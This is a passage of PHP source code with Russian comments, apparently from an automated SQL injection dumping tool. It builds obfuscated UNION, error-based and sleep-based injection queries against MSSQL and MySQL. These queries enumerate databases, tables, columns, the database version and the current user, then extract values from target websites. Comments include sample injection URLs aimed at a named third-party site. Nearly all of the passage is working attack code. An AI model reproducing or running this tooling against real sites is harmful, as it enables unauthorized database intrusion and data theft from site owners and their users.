		$mssql = $this->mssqlGetValue("(/**/sElEcT top 1 /**/cAsT(count(*) as char) /**/fRoM [{$bd}]..[sysobjects] /**/wHeRe xtype=char(85))");	
		$count =  $mssql["(/**/sElEcT top 1 /**/cAsT(count(*) as char) /**/fRoM [{$bd}]..[sysobjects] /**/wHeRe xtype=char(85))"];
		
		
		$table = $this->mssqlGetValue("(/**/sElEcT /**/dIsTiNcT top 1 /**/cAsT([name] as nvarchar) /**/fRoM [{$bd}]..[sysobjects] /**/wHeRe id=(/**/sElEcT top 1 id /**/fRoM (/**/sElEcT /**/dIsTiNcT top 1 id /**/fRoM [{$bd}]..[sysobjects] /**/wHeRe xtype=char(85) order BY id ASC) sq order BY id DESC))");
		
		$this->d($table,'$table_ONE');
		//$count = 5;
		
	
		
		for ($i=2;$i<$count;$i++)
		{
			
			$qq = $this->mssqlGetValue("(/**/sElEcT /**/dIsTiNcT top 1 /**/cAsT([name] as nvarchar) /**/fRoM [{$bd}]..[sysobjects] /**/wHeRe id=(/**/sElEcT top 1 id /**/fRoM (/**/sElEcT /**/dIsTiNcT top {$i} id /**/fRoM [{$bd}]..[sysobjects] /**/wHeRe xtype=char(85) order BY id ASC) sq order BY id DESC))");
			
			$mssql[] = $qq["(/**/sElEcT /**/dIsTiNcT top 1 /**/cAsT([name] as nvarchar) /**/fRoM [{$bd}]..[sysobjects] /**/wHeRe id=(/**/sElEcT top 1 id /**/fRoM (/**/sElEcT /**/dIsTiNcT top {$i} id /**/fRoM [{$bd}]..[sysobjects] /**/wHeRe xtype=char(85) order BY id ASC) sq order BY id DESC))"];
			
		}
		
		return $mssql;
		
		
	}
	
	function mssqlGetAllBd(){ //получение имен всех БД (sysdatabases базы данных) из master
	

		
			
		$data = $this->mssqlGetValue("(/**/sElEcT top 1 /**/cAsT(count(*) as char) /**/fRoM [master]..[sysdatabases])");
		$res = $data["(/**/sElEcT top 1 /**/cAsT(count(*) as char) /**/fRoM [master]..[sysdatabases])"];
		
		$count = $res;
		$this->d($count,'mssqlGetCountBd');

		$this->timeaut = 20;
		
		$this->mssqlGetDatabase();
		
		if($this->database !='')
			{
				$mssql[] = $this->database; 
	
				$this->d($this->database,'$this->database mssqlGetAllBd');
			
			}
		
		
		for ($i=1;$i<$count;$i++)
		{
			//select AH_NAME1 COLLATE DATABASE_DEFAULT from GGIMAIN.SYSADM.BW_AUFTR_KOPF
			//$qq = $this->mssqlGetValue("(/**/sElEcT /**/dIsTiNcT top 1 /**/cAsT([name] as nvarchar)  /**/fRoM [master]..[sysdatabases] /**/wHeRe [dbid]=$i)");
			//$mssql[] = $qq["(/**/sElEcT /**/dIsTiNcT top 1 /**/cAsT([name] as nvarchar) /**/fRoM [master]..[sysdatabases] /**/wHeRe [dbid]=$i)"];
			
			$qq = $this->mssqlGetValue("(/**/sElEcT /**/dIsTiNcT top 1 /**/cAsT([name] as nvarchar) /**/COLLATE DATABASE_DEFAULT  /**/fRoM [master]..[sysdatabases] /**/wHeRe [dbid]=$i)");
			
			$bd =  $qq["(/**/sElEcT /**/dIsTiNcT top 1 /**/cAsT([name] as nvarchar) /**/COLLATE DATABASE_DEFAULT  /**/fRoM [master]..[sysdatabases] /**/wHeRe [dbid]=$i)"];
			
			if($bd !='')
			{
				$mssql[] = $bd;
			}
		
			
			
			
		}
		

			
		
			//$this->d($this->database,'$this->database');
			
			
			//$this->mssqlGetDatabase();
			//$this->d($this->database,'$this->database2222');
			//exit;
		
			
		
	
		
		
		$mssql = array_unique($mssql);
		return $mssql;

		//}//else
		//{
					
			//$mysql = explode(',', $mysql['concat(cast(group_concat(schema_name) as char))']);
			//return $mysql;
			
		//}
		
	

		
	}
	
	
	////
	
	function mssqlGetVersion(){ //определение версии базовая функция
		
		
		
			
			$data = $this->mssqlGetValue("(/**/cAsT(@@version as char))");
			$this->version = $data["(/**/cAsT(@@version as char))"];
			$this->version = $this->filter_str($this->version);
			
			//$this->d($data,'$data');
		
		
	}
	
	function mssqlGetDatabase(){ //получить текущую БД
	
		
			$data = $this->mssqlGetValue('db_name()');
			//$this->d($data,'$data');
			$this->database = $data['db_name()'];
		
			
			//$this->d($this->database,'$this->database');
		
	}
	
	function mssqlGetUser(){ //определение юзера выводит
		
		//sYsTeM_UsEr
		$data = $this->mssqlGetValue('USeR_NaME()');
		
		$this->user = $data['USeR_NaME()'];
		$this->user = $this->filter_str($this->user);
		
	}
	
	
	
	
	function mssqlGetColumns_inf($bd,$table){//получение всех колонок у кокретной БД и ТАБЛИЦЫ
		
		$table_new = $this->charcher_mssql($table);
		
		$count = 50;
		
		for ($i=0;$i<$count;$i++)
		{
			
			$qq = $this->mssqlGetValue("(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top $i column_name from $bd.information_schema.columns where table_name=$table_new order BY column_name ASC) sq order BY column_name DESC)");
			
			$column = $qq["(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top $i column_name from $bd.information_schema.columns where table_name=$table_new order BY column_name ASC) sq order BY column_name DESC)"];
			
			//$this->d($qq,'$qq');
			//exit;
			
			
			if($column !='')
			{
				$mssql[] = $column;
			}
			
			$count_all = count($mssql);
			$count_unique = count(array_unique($mssql));
			
			
			$this->d($count_all,'$count_all');
			$this->d($count_unique,'$count_unique');
			
			if($count_all > $count_unique){
				$this->d('STOP');
				break;
			}
			
			
			
			
		}
		
		
		return array_unique($mssql);
		
		
	}
	
	function mssqlGetAllTables_inf($bd){//получение ВСЕХ ТАБЛИЦ у конкретной БД
		
		$count = $this->mssqlGetValue("(/**/sElEcT /**/distinct top 1 /**/cAsT(count(*) as char) /**/fRoM {$bd}.information_schema.tables)");
		
		$count = $count["(/**/sElEcT /**/distinct top 1 /**/cAsT(count(*) as char) /**/fRoM {$bd}.information_schema.tables)"];
		
		$this->d($count,'count'.$bd);
		
		
		//$count=30;
		
		for ($i=1;$i<$count;$i++)
		{
			
			$qq = $this->mssqlGetValue("(/**/sElEcT /**/distinct top 1 /**/table_name /**/fRoM (/**/sElEcT /**/distinct top $i table_name from {$bd}.information_schema.tables order BY table_name ASC) sq order BY table_name DESC)");
			
			
			$table_one = $qq["(/**/sElEcT /**/distinct top 1 /**/table_name /**/fRoM (/**/sElEcT /**/distinct top $i table_name from {$bd}.information_schema.tables order BY table_name ASC) sq order BY table_name DESC)"];
			
			
			
			if($table_one !='')
			{
				$mssql[] = $table_one;
			}else{
				break;
			}
			
			
			
			
		}
		$mssql = array_unique($mssql);
		return $mssql;
		
		
	}
	
	
	
	
	////////////////////////////////////////////////////////////////	
	/////////Функции определения конкретных параметров для MYSQL////
	////////////////////////////////////////////////////////////////
	
	function mysqlGetAllBd(){ //получение всех баз данных
	
	
		//$this->mysqlGetVersion();
		
		$count = $this->mysqlGetCountInsert('information_schema', 'schemata');
		
		//$this->d($count,'$count');
		
		if($count < 10)
		{
				//$this->d('group_concat mysqlGetAllBd');
				$mysql = $this->mysqlGetValue('information_schema', 'schemata', 'concat(cast(group_concat(schema_name) as char))',0,array());
				
				//$mysql = false;
			
				
				if($mysql==false)
				{
			
				}else
				{
					$mysql = explode(',', $mysql['concat(cast(group_concat(schema_name) as char))']);
					//$this->d($mysql,'$mysql');
					//exit;
					return $mysql;
				}	
		}
		
		
			//$count=0;
			$this->timeaut = 20;
			
			for ($i=0;$i<$count;$i++)
			{
				
				$qq = $this->mysqlGetValue('information_schema', 'schemata', array('SCHEMA_NAME'),$i);
				
				//$this->d($qq,'$qq');
				$mysql[] = $qq['SCHEMA_NAME'];
				
			}
			
			
			//$this->d($mysql,'$mysql');
			
			
			if(empty($mysql)){
				
				$this->mysqlGetDatabase();
				$mysql[] = $this->database; 
				
				//$this->d($this->database,'$this->database');
				
				if($this->database !=''){return $mysql;}
			}
			
			
			return $mysql;
			
			
		
		
	}
	
	function mysqlGetFieldByTable($bd,$table){//получение полей из бд и таблицы
		
		$count = $this->mysqlGetCountInsert('information_schema', 'COLUMNS','WHERE TABLE_SCHEMA='.$this->strToHex($bd).' AND TABLE_NAME='.$this->strToHex($table).'');
		
		if($count < 15)
		{
			$mysql = $this->mysqlGetValue('information_schema', 'COLUMNS', array('concat(cast(group_concat(COLUMN_NAME) as char))'),0,array(),'WHERE TABLE_SCHEMA='.$this->strToHex($bd).' AND TABLE_NAME='.$this->strToHex($table).'');
			
				if($mysql==false)
				{
					
				}else
			{
					
				$mysql = explode(',', $mysql['concat(cast(group_concat(COLUMN_NAME) as char))']);
				return $mysql;
				
			}	
			
		}
		

			$this->timeaut = 20;
			
			for ($i=0;$i<$count;$i++)
			{
				
				$qq = $this->mysqlGetValue('information_schema', 'COLUMNS', array('column_name'),$i,array(),'WHERE TABLE_SCHEMA='.$this->strToHex($bd).' AND TABLE_NAME='.$this->strToHex($table).'');
				
				$qq['column_name'] = str_replace('//','',$qq['column_name']);
				$mysql[] = $qq['column_name'];
				
			}
			
			return $mysql;

		
		
	///	return $mysql;
		
	}
	
	function mysqlGetTablesByDd($bd){//получение таблиц из БД
		
		//$this->d('mysqlGetTablesByDd( nacahlo');
		
		$count = $this->mysqlGetCountInsert('information_schema', 'tables','WHERE TABLE_SCHEMA='.$this->strToHex($bd).'');
		
		//$this->d($count,'$count');
		
		if($count < 15)
		{
			$mysql = $this->mysqlGetValue('information_schema', 'tables', array('concat(cast(group_concat(table_name) as char))'),0,array(),'WHERE TABLE_SCHEMA='.$this->strToHex($bd).'');
			//$this->d($mysql,'mysqlGetTablesByDd');
			
			if($mysql==false)
			{
			
			}else
			{
				
				$mysql = explode(',', $mysql['concat(cast(group_concat(table_name) as char))']);
				//$this->d('mysql TRUE bd');
			
				return $mysql;
			
			}	
		}
			
		
			//$this->d('mysql false<br>');
		
			
			
		
			
			$k = 0;
			
			$this->timeaut = 20;
			
			for ($i=0;$i<$count;$i++)
			{
				
				$qq = $this->mysqlGetValue('information_schema', 'tables', array('table_name'),$i,array(),'WHERE TABLE_SCHEMA='.$this->strToHex($bd).'');
				$mysql[] = $qq['table_name'];
				
				//$this->d($qq['table_name'],'$qq[table_name]');
				//if($i==2)return $mysql;
			
				
				
				if(empty($qq['table_name']))$k++;
				
				if($k==4)
				{
					$this->d('k==4 huevo pusto');
					return $mysql;
				}
				
			}
			
			return $mysql;
		
			
	}

	function mysqlGetCountTablesBD($bd){// получение количества таблиц у БД
		
		$count = $this->mysqlGetCountInsert('information_schema', 'tables','WHERE TABLE_SCHEMA='.$this->strToHex($bd).'');
		
		//$this->d($count,'$count');
		//exit;
		return $count;
		
	}
	
	function mysqlGetVersion(){ //определение версии базовая функция
		
		
	
		$data = $this->mysqlGetValue('','','vErsion()',$limit=0,$order=array(),$where='');
		

		$this->version = $data['vErsion()'];
		$this->version = $data['vErsion()'];
		$this->version = $this->filter_str($this->version);
		
		$g = $data['vErsion()'];
		return $g;
		
		
		//$this->version = $this->filter_str($this->version);
		
		//$this->d($this->version,'$this->version');
		
		//$this->d($data,'$this->mysqlGetValue');
		
		
		
	}
	
	function mysqlGetUser(){ //определение юзера выводит
		
		
		$data = $this->mysqlGetValue('','','UseR()',$limit=0,$order=array(),$where='');
		
		$this->user = $data['UseR()'];
		$this->user = $this->filter_str($this->user);
		
		
		
	}
	
	function mysqlGetDatabase(){ //получить текущую БД
	
		if($this->mssql==true)
		{
			$data = $this->mssqlGetValue('','','db_name()',$limit=0,$order=array(),$where='');
			$this->database = $data['db_name()'];
		}else
		{
			$data = $this->mysqlGetValue('','','database()',$limit=0,$order=array(),$where='');
			$this->database = $data['database()'];
		}	
		
			$this->d($this->database,'$this->database');
		
	}
	
	
	
	 
	
	////////////////////////////////////////////////////////////////
	///////////////БАЗОВЫЕ ДЛЯ ЗАПРОСОВ MYSQL///////////////////////
	////////////////////////////////////////////////////////////////
	
	
	
	
	function mysqlGetValue_old($bd,$table,$pole,$limit=0,$order=array(),$where=''){
		
			if($this->method_hex ==true  AND $this->method_auto ==false){
				$data = $this->mysqlGetValueHEX($bd,$table,$pole,$limit,$order,$where);
				return $data;
			}
			
			
			if($this->method_char ==true AND $this->method_auto ==false){
				$data = $this->mysqlGetValueCHAR($bd,$table,$pole,$limit,$order,$where);
				return $data;
			}
			
			
			
			if($this->method_auto ==true)
			{
			
				
				
				if($this->method_hex ==true){
					
					$data = $this->mysqlGetValueHEX($bd,$table,$pole,$limit,$order,$where);
				}else
				{
					
					
					if($this->method_char ==true)
					{
						$data = $this->mysqlGetValueCHAR($bd,$table,$pole,$limit,$order,$where);
						
						if($data[0] !='' AND count($data)==0)
						{
							$this->method_char = true;
							return $data;
						}
						
					}
					
				
					
					
					if($data[0]=='' AND count($data)==0)
					{
						
						$data = $this->mysqlGetValueHEX($bd,$table,$pole,$limit,$order,$where);
						
						
						if($data[0] =='' AND count($data)==0)
						{
							
							$data = $this->mysqlGetValueCHAR($bd,$table,$pole,$limit,$order,$where);
							
							if($data[0] =='' AND count($data)==0)
							{
									
								$this->method_hex = true;
									
									
							}else{
								$this->method_char =true;
							}
							
						}else{
							$this->method_hex = true;
						}
							
						
							
					}
				}
				
				
				return $data;
			}
		
	}
	
	
	function mysqlGetValue($bd,$table,$pole,$limit=0,$order=array(),$where=''){
		
			if($this->method_hex ==true  AND $this->method_auto ==false){
               
				$data = $this->mysqlGetValueHEX($bd,$table,$pole,$limit,$order,$where);
                
                $out = array_keys($data); 
                
                  if(trim($data[$out[0]])!='' AND count($data) >0)
                    {
                       $this->method_hex = true;
                       
                        //$this->d('!!!method_hex!!!!');
                        return $data;
                
                    }
			}
           
			
			
			if($this->method_char ==true AND $this->method_auto ==false){
				$data = $this->mysqlGetValueCHAR($bd,$table,$pole,$limit,$order,$where);
               
                
                $out = array_keys($data); 
                
                  if(trim($data[$out[0]])!='' AND count($data) >0)
                    {
                        
                        //$this->d('!!!method_CHAR!!!!');
                        $this->method_char = true;
                        return $data;
                    }
                
                
				
			}
			
			
			if($this->method_ifnull ==true AND $this->method_auto ==false){
				$data = $this->mysqlGetValueIFNULL($bd,$table,$pole,$limit,$order,$where);
                
                $out = array_keys($data); 
                
                 if(($data[0] !='' AND count($data) >0)  or trim($data[$out[0]])!='')
                    {
                        
                        //$this->d('!!!method_ifNULL!!!!');
                        $this->method_ifnull=true;
                        return $data;
                
                    }
			}
			
			
			if($this->method_auto ==true)
			{
			
				
				
				if($this->method_hex ==true)
                {
					
				    $data = $this->mysqlGetValueHEX($bd,$table,$pole,$limit,$order,$where);
                    
                    
                    $out = array_keys($data); 
						
                        
                    if(count($data)==0 or  trim($data[$out[0]])=='')
                    {
                        
                        $data = $this->mysqlGetValueCHAR($bd,$table,$pole,$limit,$order,$where);
                        
                        $out = array_keys($data);
                        
                         
                        if(count($data)==0 or  trim($data[$out[0]])=='')
                        {
                                $data = $this->mysqlGetValueIFNULL($bd,$table,$pole,$limit,$order,$where);
                                
                                $out = array_keys($data);
                                
                                if(count($data)==0 or  trim($data[$out[0]])=='')
                                {
                                    $this->method_hex = true;
                                    return $data;
                                }else{
                                   
                                    $this->method_ifnull = true;
                                    return $data;
                                }	
                                
                        }else{
                            
                             //$this->d('!!!method_char AUTO!!!!');
                             
                             $this->method_char =true;
                             return $data;
                        }
                        
                    }else{
                        //$this->d('!!!method_hex AUTO!!!!');

                        $this->method_hex = true;
                        return $data;
                    }
                        
                        
                    return $data;
                  
                    
				}elseif($this->method_ifnull==true)
				{
					$data = $this->mysqlGetValueIFNULL($bd,$table,$pole,$limit,$order,$where);
					
					 $out = array_keys($data); 
						
                        
                    if(count($data)==0 or  trim($data[$out[0]])=='')
                    {
                        
                        $data = $this->mysqlGetValueCHAR($bd,$table,$pole,$limit,$order,$where);
                        
                        $out = array_keys($data);
                        
                         
                        if(count($data)==0 or  trim($data[$out[0]])=='')
                        {
                                $data = $this->mysqlGetValueHEX($bd,$table,$pole,$limit,$order,$where);
                                
                                $out = array_keys($data);
                                
                                if(count($data)==0 or  trim($data[$out[0]])=='')
                                {
                                    $this->method_ifnull = true;
                                    return $data;
                                }else{
                                  
                                    
                                    $this->method_hex = true;
                                    return $data;
                                }	
                                
                        }else{
                            
                             //$this->d('!!!method_char AUTO!!!!');
                             
                             $this->method_char =true;
                             return $data;
                        }
                        
                    }else{
                        //$this->d('!!!method_hex AUTO!!!!');

                         $this->method_ifnull = true;
                        return $data;
                    }
                        
                        
                    return $data;
						
					
				}else
				{
					
					
					if($this->method_char ==true)
					{
                        $data = $this->mysqlGetValueCHAR($bd,$table,$pole,$limit,$order,$where);
						
                      
                      
					
                        $out = array_keys($data); 
						
                        
                        if(count($data)==0 or  trim($data[$out[0]])=='')
                        {
                            
                             $data = $this->mysqlGetValueIFNULL($bd,$table,$pole,$limit,$order,$where);
                            
                            $out = array_keys($data);
                            
                             
                            if(count($data)==0 or  trim($data[$out[0]])=='')
                            {
                                    $data = $this->mysqlGetValueHEX($bd,$table,$pole,$limit,$order,$where);
                                    
                                    $out = array_keys($data);
                                    
                                    if(count($data)==0 or  trim($data[$out[0]])=='')
                                    {
                                        $this->method_char =true;
                                        return $data;
                                    }else{
                                      
                                        
                                        $this->method_hex = true;
                                        return $data;
                                    }	
                                    
                            }else{
                                
                                 //$this->d('!!!method_char AUTO!!!!');
                                 
                                  $this->method_ifnull = true;
                                 return $data;
                            }
                            
                        }else{
                            //$this->d('!!!method_hex AUTO!!!!');

                                $this->method_char =true;
                                return $data;
                        }
                            
                        
                        return $data;

					}
					
				   
					
					
					if(count($data)==0 or  trim($data[$out[0]])=='')
					{
						
						$data = $this->mysqlGetValueHEX($bd,$table,$pole,$limit,$order,$where);
						
                        
                        //$this->d($data,'$data$data$data');
                        
                       
                        $out = array_keys($data); 
						
                        
						if(count($data)==0 or  trim($data[$out[0]])=='')
						{
							
							$data = $this->mysqlGetValueCHAR($bd,$table,$pole,$limit,$order,$where);
                            
                            $out = array_keys($data);
							
                             
							if(count($data)==0 or  trim($data[$out[0]])=='')
							{
									$data = $this->mysqlGetValueIFNULL($bd,$table,$pole,$limit,$order,$where);
									
                                    $out = array_keys($data);
                                    
									if(($data[0] =='' AND count($data)==0) or trim($data[$out[0]])=='' )
									{
										$this->method_hex = true;
									}else{
										$this->method_ifnull = true;
									}	
									
							}else{
                                 //$this->d('!!!method_char AUTO CHAR!!!!');
								 $this->method_char =true;
							}
							
						}else{
                             //$this->d('!!!method_hex AUTO HEX!!!!');
                            
							$this->method_hex = true;
						}
								
					}
				}
				
				
				return $data;
			}
		
	}
	
	
	
	function mysqlGetValueHEX($bd,$table,$pole,$limit=0,$order=array(),$where=''){//общая функция для MYSQL через HEX с sqli dumper
		

		
		//$this->d($order,'$order!');
	
		
		
		if($this->method==10)
		{
			$get = $this->mysqlGetValueSleep($bd,$table,$pole,$limit,$order,$where);
			if($get!==false)return $get;
			return false;

		}
	
		if($this->method==6)
		{
			//$this->d('tochka: method==6 mysqGetValueByErrorNewW');
			$get = $this->mysqGetValueByErrorNew($bd,$table,$pole,$limit,$order,$where);;
			if($get!==false)return $get;
			return false;

		}	
	
		if($this->method==5)
		{

			//$this->d('tochka: method==5 mysqlGetByOrder');
			$get = $this->mysqlGetByOrder($bd,$table,$pole,$limit,$order,$where);
			if($get!==false)return $get;
			return false;

		}
		
		if($this->method==4)
		{
			//$this->d('tochka: method==4 mysqGetValueByError');
			$get = $this->mysqGetValueByError($bd,$table,$pole,$limit,$order,$where);;
			if($get!==false)return $get;
			return false;

		}
		
		
		//$this->d('method po umolchaniy');
		
		if($table!=='')
		{
			
			if($bd==''){
				$from = 'FROM+'.$table.'';
			}else{
				$from = 'FROM+'.$bd.'.'.$table.'';
			}
		}else{
			$from = '';
		}
		
		
		$bd =    str_replace(' ', '+',$bd);
		$table = str_replace(' ', '+',$table);
		$from =  str_replace(' ', '+',$from);
		$where = str_replace(' ', '+',$where);
		$order = str_replace(' ', '+',$order);
		
		
		$method = $this->sposob;
		
		//$this->d($method,'$method = $this->sposob');
		
		
		//$this->d($where,'$where');
		
		//начало лимита
		$limit = $limit.',1';
							
		$n = $this->variant_query[$this->sposob][$this->method][0];//начало запроса
		$k = $this->variant_query[$this->sposob][$this->method][1];//конец  запроса
		
		//$this->d($n,'начало запроса');
		//$this->d($k,'конец  запроса');
		
		//$this->d($this->column,'$this->column');
		//$this->d($this->work,'$this->work');
		
	
		$query = "1111111111111$n";//начальный запрос для НЕ sleep
		
			
	
		if(!is_array($pole))$pole = array($pole);//это как раз наш запрос version к примеру
		
		$zapr = '';//общая строка для наших полей
		 
		 
		 //http://m.loading.se/news.php?pub_id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,(select distinct concat(0x7e,0x27,unhex(Hex(cast(schema_name as char))),0x27,0x7e) from `information_schema`.schemata limit 4,1),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
		 
		 //select distinct
		 
		 
		 //http://m.loading.se/news.php?pub_id=4192011111111111111111111111111%20UNION%20SELECT%201,2,3,4,(select%20CONCAT(0x5b6464645d,unhex(Hex(cast(%20as%20char))),0x5b6464645d)%20FROM%20information_schema.schemata%20limit%201,1),6,7,8%20--%20
		 
		//обволакиваем его спец символами, чтобы патом найти можно было бы
		foreach ($pole as $key=>$val)
		{
	  	
		 	if(count($pole)==1)
			{
				//$mer = $table.'.'.$val;
				//$mer = $val;			
				//$mer2 = '['.$val.']';
				
				//если одно поле
				//$zapr .= "unhex(Hex(cast($mer as char))),0x5e,";
		 		//$zapr .= 'CHAR('.$this->charcher('[X]').')'.','.$val.',CHAR('.$this->charcher('[XX]').')';
		
				//$zapr .= "IFNULL(unhex(Hex(cast($val as char))),'')";
				$zapr .= "IFNULL(unhex(Hex(cast($val as char))),0x20)";
				
				// $zapr .= "unhex(Hex(concat(cast(group_concat(table_name) as char))))";
				 
				// $zapr .= "concat(cast(group_concat(table_name) as char))";
				
		 		
		 	}else
			{
				
				
		 	
				//если несколько найти надо
				
				//$mer = $table.'.'.$val;
				//$mer = $val;			
				//$mer2 = '['.$val.']';
				
				//	$zapr .= "IFNULL(unhex(Hex(cast($val as char))),' ')";
				//$zapr .= ",0x5e,unhex(Hex($mer))";
				//$zapr .= ",unhex(Hex($mer))unhex(Hex(cast($mer as char))),unhex(Hex($mer))";
				//$zapr .= ',CHAR('.$this->charcher('['.$val.']').')'.','.$val.',CHAR('.$this->charcher('['.$val.']').')';
				
				//$zapr .= "0x5e,IFNULL(unhex(Hex(cast($val as char))),''),0x5e,";
					
					
					
				//$zapr .= "0x5e,IFNULL(cast($val as char),0x20),0x5e,";
					
				$zapr .= "0x5e,IFNULL(unhex(Hex(cast($val as char))),0x20),0x5e,";		
					
				//$zapr .= "0x5e,IFNULL(cast($val as char),0x20),0x5e,";	

		 	}
			
			
			
	  	
		}
		
		//$this->d($zapr,'final $zapr');
	  
		
		
		 $work_count = count($this->work);//рабочие поля где вывод есть
		
		 $new = array(); // Что на выходе

		 $give = 0;
		 
		
		
			
			
		//if($this->desc ==0 AND $this->desc_enable == true)
			//{	
				//$order2 = 'ORDER+by+id+DESC';
			//}
            
        if(is_array($order) AND count($pole)>1 and $order[0] !='')
			{
				$order2 = '+order+by+`'.$order[0].'`+DESC+';
               
                
			}elseif(!is_array($order) and $order !=''){
                
                $order2 = '+order+by+'.$order.'+DESC+';
            }else
			{
				$order2 = '';
			}
		     
            
            
            
			
			
		 
		 //подставляем колонки
		 for($col=1;$col<=$this->column;$col++)
			{
				if($col==1){$zap='';}else{$zap=',';}//запятая
			
				if(in_array($col, $this->work) AND $give==0)
				{

					$p = $col-1;

					$give++;
					
					//$query .= $zap."CONCAT(CHAR(".$this->charcher('ddd')."),$zapr)";
					
					$hh = $this->strtohex('[ddd]');
					
					$query .= $zap."(select+CONCAT($hh,$zapr,$hh)".'+'.$from.'+'.$where.'+'.$order2.'+limit+'.$limit.')';
					
					 //$this->d($query ,'$query  11111111');
					
				}else
				{
						
					
						$query .= $zap.$col;	
                               
				}
			}
               // $this->d($query ,'$query 2222222');
            //  exit;
				
				if($this->debug==true){$this->d($query,'$query mysqlGetValueHEX');}
				#exit;
	
			
			
				//$url1 = $this->url.$query.'+'.$from.'+'.$where.'+'.$order.'+limit+'.$limit.''.$k;
				$url1 = $this->url.$query.''.$k;
					
				
				$url1 = str_replace(',,', ',',$url1);
				$url1 = str_replace('++++', '+',$url1);
				$url1 = str_replace('+++', '+',$url1);
				$url1 = str_replace('++', '+',$url1);
				
				//if($this->debug==true){$this->d($url1,'$url1 полный mysqlGetValue CLEAN HEX');}
				
				//exit;
				
				$file = $this->getContents($url1);
				
				
				
				if($this->head_enable==true){
					
					file_put_contents('./file_hex_head.txt',$file);
				}else{
					file_put_contents('./file_hex.txt',$file);
				}
				
				
				//$this->d($file,'file');
				//exit;
				
				//ищем результаты	
				if(count($pole)==1) //если он один предполагается
				{
		 		
					//preg_match_all("/\[X\](.*?)\[XX\]/is",$file,$arr);
					
					preg_match_all("|\[ddd\](.*?)\[ddd\]|i",$file,$arr);
					//preg_match("|\[ddd\](.*?)\[ddd\]|i",$file,$arr);
					
					
					//$this->d($arr,'arr ONE POLE HEX');
					
					//if(strlen($arr[1][0])>500)return false;	

					if(isset($arr[1][0]))return array($pole[0]=>$arr[1][0]);
					
					return false;
		 		
				}else//если не сколько полей было
				{
		 				
					
			 	
						//preg_match_all("~\[{$val}\](.*?)\[{$val}\]~iS",$file,$arr);
						
						preg_match_all("|\[ddd\](.*?)\[ddd\]|i",$file,$arr);
						//preg_match("|\[ddd\](.*?)\[ddd\]|i",$file,$arr);
						
						//preg_match_all("~\^(.*?)\^~is",$arr22[0],$arr);
						
						//$this->d("~\[{$val}\](.*?)\[{$val}\]~iS",'reg ALL');
						
						//$this->d($arr,'arrA_LLL POLE HEX');
						
						
							
						
					$j=1;
					
					foreach ($pole as $val)
					{
						
						
						
						//if(strlen($arr[1][0])>500)return false;	
						
				
						if(isset($arr[1][0]))
						{
							
							$arr[1][0] = str_replace('^^','^',$arr[1][0]);
							
							$b = explode('^',$arr[1][0]);
							
							$b_bew = array_filter($b, function($element) {
								return !empty($element);
							});
							
							
							//$this->d($b,'b');
							//$this->d($b_bew,'b_new');
							
							$export[$val] = $b[$j];
						}else
						{
							$export[$val] = '';
					

						}
						
						$j++;
						
					}
					
					
					
				}
			
			
			
			if(isset($export))
			{	
				return $export;
			}
			
			return false;

	}
	
	function mysqlGetValueCHAR($bd,$table,$pole,$limit=0,$order=array(),$where=''){//общая функция для MYSQL через CHAR старая
		
		//$this->d($this->url,'$this->url');
		
		//$this->d('tochka: mysqlGetValue NACHALO');
		
		//$this->d($pole,'$table');
		
		//exit;
		
	
		
		
		if($this->method==10)
		{
			//$this->d('tochka: method==10 SLEEP mysqlGetValueSleep');
			$get = $this->mysqlGetValueSleep($bd,$table,$pole,$limit,$order,$where);
			if($get!==false)return $get;
			return false;

		}
	
		if($this->method==6)
		{
			//$this->d('tochka: method==6 mysqGetValueByErrorNewW');
			$get = $this->mysqGetValueByErrorNew($bd,$table,$pole,$limit,$order,$where);;
			if($get!==false)return $get;
			return false;

		}	
	
		if($this->method==5)
		{

			//$this->d('tochka: method==5 mysqlGetByOrder');
			$get = $this->mysqlGetByOrder($bd,$table,$pole,$limit,$order,$where);
			if($get!==false)return $get;
			return false;

		}
		
		if($this->method==4)
		{
			//$this->d('tochka: method==4 mysqGetValueByError');
			$get = $this->mysqGetValueByError($bd,$table,$pole,$limit,$order,$where);;
			if($get!==false)return $get;
			return false;

		}
		
		
		//$this->d('method po umolchaniy');
		
		if($table!=='')
		{
			
			if($bd==''){
				$from = 'FROM+'.$table.'';
			}else{
				$from = 'FROM+'.$bd.'.'.$table.'';
			}
		}else{
			$from = '';
		}
		
		
		$bd =    str_replace(' ', '+',$bd);
		$table = str_replace(' ', '+',$table);
		$from =  str_replace(' ', '+',$from);
		$where = str_replace(' ', '+',$where);
		$order = str_replace(' ', '+',$order);
		
		
		$method = $this->sposob;
		
		//$this->d($method,'$method = $this->sposob');
		
		
		
		
		//начало лимита
		$limit = $limit.',1';
							
		$n = $this->variant_query[$this->sposob][$this->method][0];//начало запроса
		$k = $this->variant_query[$this->sposob][$this->method][1];//конец  запроса
		
		//$this->d($n,'начало запроса');
		//$this->d($k,'конец  запроса');
		
		//$this->d($this->column,'$this->column');
		//$this->d($this->work,'$this->work');
		
	
		$query = "1111111111111$n";//начальный запрос для НЕ sleep
		
			
	
		if(!is_array($pole))$pole = array($pole);//это как раз наш запрос version к примеру
		
		$zapr = '';//общая строка для наших полей
		 
		//обволакиваем его спец символами, чтобы патом найти можно было бы
		foreach ($pole as $key=>$val)
		{
	  	
		 	if(count($pole)==1)
			{
				//если одно поле
		 		$zapr .= 'CHAR('.$this->charcher('[X]').')'.','.$val.',CHAR('.$this->charcher('[XX]').')';
				
				//$zapr .= 'IFNULL(CHAR('.$this->charcher('[X]').')'.','.$val.',CHAR('.$this->charcher('[XX]').'),0x20)';
				
		 	}else
			{
				//если несколько найти надо
		 		$zapr .= ',CHAR('.$this->charcher('['.$val.']').')'.','.$val.',CHAR('.$this->charcher('['.$val.']').')';
				
				//$zapr .= "0x5e,IFNULL(unhex(Hex(cast($val as char))),0x20),0x5e,";
		 	}
	  	
		}
		
		//$this->d($zapr,'final $zapr');
	  
